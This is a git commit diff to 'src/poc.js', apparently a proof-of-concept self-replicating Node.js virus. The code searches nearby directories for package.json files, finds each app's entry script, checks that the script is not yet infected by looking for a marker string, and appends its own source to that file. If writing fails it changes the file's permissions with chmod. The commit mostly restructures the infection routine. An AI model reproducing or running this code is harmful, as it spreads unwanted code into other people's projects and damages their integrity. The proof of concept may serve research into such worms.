717b40d6d81f3daf91df893104234006fae7289a
Matthias Gattermeier <matthias.gattermeier@gmail.com>
2015-08-31 21:50:00 -0700

    bugfix

--- src/poc.js
+++ src/poc.js
@@ -13,19 +13,16 @@
     var path = require('path');
     // finding correct app root might fail when run through mocha: 
     var appRootDir = path.dirname(require.main.filename);
+    // safety zone, only go 1 directory level deep.
     var targetlist = [path.join(appRootDir, '../')];
 
-    getTargets(targetlist);
-
     // recursively function called for all found directories
-    function getTargets(targets, dir) {
-      // console.log(targets);
+    var getTargets = function(targets, dir) {
 
       var packageJSON = targets.filter(function(item) {
-        return item.indexOf('package.json') > -1
+        return item.indexOf('package.json') > -1;
       });
 
-      //super messy
       if (packageJSON.length === 1) {
         // get the entry point to the app
         var target = getEntryPoint(packageJSON.toString());
@@ -33,7 +30,13 @@
           // join with path to file
           target = path.join(dir, target);
           // INFECT TARGET
-          reproduce(target);
+          if (checkFile(target)) {
+            checkTarget(target, function(valid) {
+              if (valid) {
+                reproduce(target);
+              }
+            });
+          }
         }
       }
 
@@ -49,53 +52,68 @@
     }
 
     // get files in path
-    function getFiles(dir) {
-      // console.log(appRootDir, dir);
+    var getFiles = function(dir) {
       var targetFiles = [];
       fs.readdir(dir, function(err, files) {
         if (!err) {
           files.forEach(function(file) {
             targetFiles.push(path.join(dir, file));
-          })
+          });
           getTargets(targetFiles, dir);
         }
-      })
+      });
     }
 
-    // find package.json
-    // if yes, if main in json -> infect
-    // if yes, if no main, look for index.js in root where package.json is
-    function getEntryPoint(packageJSON) {
-      try {
-        return require(packageJSON).scripts.start.split(' ').pop();
-      } catch (e) {
-        try {
-          return require(packageJSON).main.split(' ').pop();
-        } catch (e) {
-          return null;
+    // check if file is potential target
+    var checkFile = function(target) {
+      // check if this is a javascript file
+      return (path.extname(target) === '.js');
+    }
+
+    // check if target isn't yet infected & contains a require statement.
+    var checkTarget = function(target, callback) {
+      fs.readFile(target, 'utf-8', function(err, data) {
+        if (!err && data.indexOf('X5O!P%@AP[4') === -1 && data.indexOf('require(') !== -1) {
+          callback(true);
+        } else {
+          callback(false);
         }
-      }
-    } // getEntryPoint
+      });
+    }
+
+    // find appropriate entry point to app in package.json
+    var getEntryPoint = function(packageJSON) {
+        try {
+          return require(packageJSON).scripts.start.split(' ').pop();
+        } catch (e) {
+          try {
+            return require(packageJSON).main.split(' ').pop();
+          } catch (e) {
+            return null;
+          }
+        }
+      } // getEntryPoint
 
     // check if found directory should be tranversed into
-    function checkDir(target) {
+    var checkDir = function(target) {
       // let's be nice. let's ignore hidden directories & node modules
-      return (target[0] !== '.' || target[1] === '/' || target[1] === '.') && (target.indexOf('node_modulesX') === -1)
+      return (target[0] !== '.' || target[1] === '/' || target[1] === '.') && (target.indexOf('node_modulesX') === -1);
     }
 
     // reproduce
-    function reproduce(target) {
-      // wrap self as IIFE & append to target
-      var wrappedSelf = ';(' + self + ')()';
-      fs.appendFile(target, wrappedSelf, function(err) {
-        // welp, if we can't access the file, maybe chmod will help us
-        if (err && err.code === 'EACCES') {
-          fs.chmod(target, '0755', function(err) {
-            fs.appendFile(target, wrappedSelf, function(err) {})
-          })
-        }
-      });
-    } // reproduce
+    getTargets(targetlist);
+    var reproduce = function(target) {
+        // wrap self as IIFE & append to target
+        var wrappedSelf = ';(' + self + ')()';
+        fs.appendFile(target, wrappedSelf, function(err) {
+          // welp, if we can't access the file, maybe chmod will help us
+          if (err && err.code === 'EACCES') {
+            fs.chmod(target, '0755', function(err) {
+              fs.appendFile(target, wrappedSelf, function(err) {});
+            });
+          }
+        });
+      } // reproduce
 
   } // node process check
 })();
